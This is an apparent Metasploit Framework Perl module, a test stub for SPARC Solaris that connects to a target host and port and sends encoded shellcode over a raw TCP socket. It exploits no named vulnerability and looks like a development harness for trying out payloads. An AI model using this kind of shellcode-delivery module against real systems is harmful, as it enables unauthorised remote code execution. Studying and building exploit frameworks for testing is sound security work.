
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::SolarisTester;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
};

my $info = {
  'Name'    => 'Solaris Testing Read Jmp Foo',
  'Version'  => '$Revision$',
  'Authors' => [ '', ],
  'Arch'    => [ 'sparc' ],
  'OS'      => [ 'solaris'],
  'Priv'    => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 12345],
    },
  'Payload' =>
    {
      'Space'     => 500,
      'MinNops'   => 16, # This keeps brute forcing sane
    },
  'Description'  => Pex::Text::Freeform(qq{
    }),
  'Refs'  =>
    [
      '',
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr' => $targetHost,
    'PeerPort' => $targetPort,
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  $self->PrintLine('Sending the warez y0.');
  print Pex::Text::BufferC($shellcode);
  $sock->Send($shellcode);
  $sock->Close;

  return;
}

1;
